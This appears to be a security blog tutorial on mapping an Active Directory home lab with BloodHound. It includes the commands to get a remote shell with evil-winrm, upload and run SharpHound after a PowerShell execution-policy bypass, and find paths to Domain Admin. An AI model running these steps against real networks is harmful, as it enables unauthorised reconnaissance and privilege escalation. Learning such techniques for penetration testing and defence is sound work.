---
title: "Enumeration By Bloodhound "
layout: post
category: Active-Directory
tags: [AD, Bloodhound]
excerpt: " "
---

# **Bloodhound Overview**

Bloodhound is a tool that is generally used by adversaries to visually map an organization’s Active Directory structure and analyze it to find its weaknesses. Being able to analyze the Active Directory is very useful to attackers to identify which objects are worth targeting in an organization. Any user within an active directory domain can interrogate their organization’s Active Directory which runs on the domain controllers.

Bloodhound uses the collector which is called as SharpHound to collect various kinds of data by running a ton of LDAP queries to collect information within Active Directory.


## Grabbing Data with Bloodhound
- Download it form github -> [link](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors)

![Desktop View](/assets/img/AD_Lab/Pasted image 20220823150132.png){: }


- Download [SharpHound.ps1](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1 "SharpHound.ps1") script on your kali machine 
- To get shell  will use [evil-winrm](github.com/Hackplayers/evil-winrm) tool


```bash

ruby evil-winrm.rb -i 192.168.1.2 -u superman -p 'Password123!'

```

![Desktop View](/assets/img/AD_Lab/Pasted image 20220823014957.png){: }

- See menu 

```bash
[+] Dll-Loader
[+] Donut-Loader
[+] Invoke-Binary
[+] Bypass-4MSI
[+] services
[+] upload
[+] download
[+] menu
[+] exit

```

![Desktop View](/assets/img/AD_Lab/Pasted image 20220823015416.png){: } 

- Upload **SharpHound.ps1** script to machine

```bash

upload /home/kali/Desktop/AD/SharpHound.ps1

```

![Desktop View](/assets/img/AD_Lab/Pasted image 20220823150719.png){: }  

- bypass  powershell policy and run script

```bash
PowerShell -ep bypass # bypass policy powershell

ls # to see the script
. .\SharpHound.ps1 # to run script

```

![Desktop View](/assets/img/AD_Lab/Pasted image 20220823150624.png){: }  

- Grabbing Data with Invoke-Bloodhound

```bash
Invoke-Bloodhound -CollectionMethod All -Domain Homelab.local -ZipFileName homelab.local.zip
```

![Desktop View](/assets/img/AD_Lab/Pasted image 20220823150840.png){: }  

- download file to local  kali machine

```bash
download 20220823031653_homlab.local.zip

```

![Desktop View](/assets/img/AD_Lab/Pasted image 20220823151052.png){: }  

- check it after download it

![Desktop View](/assets/img/AD_Lab/Pasted image 20220823151402.png){: }  


**next step install Bloodhound**

##  Bloodhound  Setup

###  Install  bloodhound

```bash
apt install bloodhound
```


### config neo4j console  
-  after run command will get link to access console

```bash
sudo neo4j console
```

![Desktop View](/assets/img/AD_Lab/Pasted image 20220823151628.png){: }  

- defualt username and pass -> neo4j

![Desktop View](/assets/img/AD_Lab/Pasted image 20220823151714.png){: }  

- change password as you like -> my new pass kali

![Desktop View](/assets/img/AD_Lab/Pasted image 20220823151734.png){: }  

## upload collection Data to Bloodhound
- Run neo4j console  on one Tab

```bash
sudo neo4j console
```

![Desktop View](/assets/img/AD_Lab/Pasted image 20220823151628.png){: }  

- Run **Bloodhound** on onther Tab

```bash
Bloodhound 
```


![Desktop View](/assets/img/AD_Lab/Pasted image 20220823151815.png){: }  

- enter  uername and new password 

![Desktop View](/assets/img/AD_Lab/Pasted image 20220823151855.png){: }  

- upload collection file to Bloodhound

![Desktop View](/assets/img/AD_Lab/Pasted image 20220823152437.png){: }  


## **Graphing the collected data**

Back on your BloodHound instance login and upload the hound.zip file via the up arrow to the right of the screen. Once imported click the 3 lines at the top left of the window to view the Database info. This shows you the AD info and relationships etc. **we have three tab database , node info  and Important one is Analysis**

![Desktop View](/assets/img/AD_Lab/Pasted image 20220823154450.png){: }  

To Graph the data, go to the Analysis tab and choose what you would like to enumerate.

![Desktop View](/assets/img/AD_Lab/Pasted image 20220823155429.png){: }  

By clicking on a node you can bring up the properties of that node

![Desktop View](/assets/img/AD_Lab/Pasted image 20220823155612.png){: }  

Selecting **“Find Shortest Paths to Domain Admins”.** This shows the shortest route to get to Domain Administrator. We can see that ecartman, who is a domain administrator is logged into machine SOUTHPARK.PWNME.LOCAL so this would be a perfect target to maybe try passing a hash and using Token Impersonation to login to the Domain Controller etc.

![Desktop View](/assets/img/AD_Lab/Pasted image 20220823155809.png){: }  

To further demonstrate the power of Blood hound, this is a result of selecting **Shortest Paths to High Value** **Targets.** This is a lab with less than 10 users and computers. Imagine a coorperate network with hundreds… This post has shown a very small fraction of what BloodHound is capable of.

![Desktop View](/assets/img/AD_Lab/Pasted image 20220823155936.png){: }  


# reference
- https://medium.com/securonix-tech-blog/detecting-ldap-enumeration-and-bloodhound-s-sharphound-collector-using-active-directory-decoys-dfc840f2f644
- https://swepstopia.com/bloodhound-enumeration/
